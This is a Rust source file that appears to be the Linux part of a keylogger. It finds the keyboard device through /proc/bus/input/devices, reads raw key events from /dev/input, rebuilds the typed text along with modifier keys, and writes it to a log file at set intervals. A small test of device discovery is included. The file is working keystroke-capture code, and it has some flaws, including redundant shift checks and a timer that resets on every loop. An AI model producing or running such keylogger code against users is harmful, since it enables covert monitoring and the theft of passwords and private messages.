use std::{fs::{File, OpenOptions}, io::{self, BufRead, Read, Cursor}, path::Path, time::SystemTime};
use byteorder::{NativeEndian, ReadBytesExt};
use anyhow::Result;

pub(crate) fn nix_find_keyboard_device() -> Result<String> {
    //let input_dir = "/dev/input/event";
    let event_definition_file = "/proc/bus/input/devices";
    let event_dir = "/dev/input/";
    let mut keyboard_file = String::new();
    let mut tmp_value = String::new();
    //Open event definitions file
    let event_file_lines = File::open(event_definition_file)?;

    for line in io::BufReader::new(event_file_lines).lines() {
        let tmp_line = line.unwrap();
        // Set handler file
        if tmp_line.contains("H: Handlers=sysrq") {
            tmp_value = Path::new(&tmp_line).file_name().unwrap().to_string_lossy().to_string();
        }
        // If handler file supports keyboard events break.
        if tmp_line.contains("EV=120013") {
            let vec = tmp_value.split(" ");
            for elem in vec {
                if elem.contains("event") {
                    tmp_value = elem.to_string();
                    break;
                }
            }
            // Format keyboard file
            keyboard_file = format!("{}{}", event_dir,tmp_value);
            break;
        }
    }

    Ok(keyboard_file)
}


pub(crate) fn nix_log_keys(keyboard_device_path: String, log_file: String, write_interval: u64) -> Result<()> {
    let mut shift: bool = false;
    let mut capslock: bool = false;
    let mut ctrl: bool = false;
    let mut option: bool = false;
    let mut func: bool = false;
    
    
    let mut file_options = OpenOptions::new();
    file_options.read(true);
    file_options.write(false);
    let mut dev_file = file_options.open(keyboard_device_path).unwrap();
    let mut packet = [0u8; 24];
    let mut capture_buffer: String = "".to_string();
    let mut now;
    let qwerty_map_no_mod = super::get_key_hash_map();

    loop {
        now = SystemTime::now();
        dev_file.read_exact(&mut packet).unwrap();
        let mut rdr = Cursor::new(packet);
        let tv_sec  = rdr.read_u64::<NativeEndian>().unwrap();
        let tv_usec = rdr.read_u64::<NativeEndian>().unwrap();
        let evtype  = rdr.read_u16::<NativeEndian>().unwrap();
        let code    = rdr.read_u16::<NativeEndian>().unwrap();
        let value   = rdr.read_i32::<NativeEndian>().unwrap();
        match now.elapsed() {
            Ok(elapsed) => {
                if elapsed.as_secs() >= write_interval {
                    if capture_buffer.len() > 0 {
                        super::log_keys_to_disk(capture_buffer.clone(), log_file.clone() )?;
                    }
                    capture_buffer = "".to_string();
                }
            }
            Err(e) => { println!("Error: {:?}", e); }
        }
        // if evtype == 1 {
        //     println!("{} {} {} {} {}", _tv_sec, _tv_usec, evtype, code, value);
        //     println!("shift: {} capslock: {} ctl: {} option: {} function: {}", shift, capslock, ctrl, option, func);
        // }
        if code != 0 && (evtype == 1 && (value == 1 || value == 0)) {
            if qwerty_map_no_mod.contains_key(&code) {
                if value == 1 {
                    if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = true };
                    if qwerty_map_no_mod[&code] == "[capslock]" { capslock = !capslock };
                    if qwerty_map_no_mod[&code] == "[Lctrl]" || qwerty_map_no_mod[&code] == "[Rctrl]" { ctrl = true };
                    if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = true };
                    if qwerty_map_no_mod[&code] == "[Loption]" || qwerty_map_no_mod[&code] == "[Roption]" { option = true };
                    if qwerty_map_no_mod[&code] == "[Lfunction]" || qwerty_map_no_mod[&code] == "[Rfunction]" { func = true };

                    capture_buffer.push_str(super::set_modifier(qwerty_map_no_mod[&code], shift, capslock, ctrl, option, func ).unwrap().as_str());
                    
                }else if value == 0 {
                    if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
                    if qwerty_map_no_mod[&code] == "[Lctrl]" || qwerty_map_no_mod[&code] == "[Rctrl]" { ctrl = false };
                    if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
                    if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
                }
            } else if value == 1 || value == 0 {
                println!("{} {} {} {} {}", tv_sec, tv_usec, evtype, code, value);
            }
        }
    }
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_nix_find_keyboard_device() -> Result<()> {
        let keyboard_device = nix_find_keyboard_device()?;
        assert!(keyboard_device.contains("/dev/input/event"));
        Ok(())
    }
}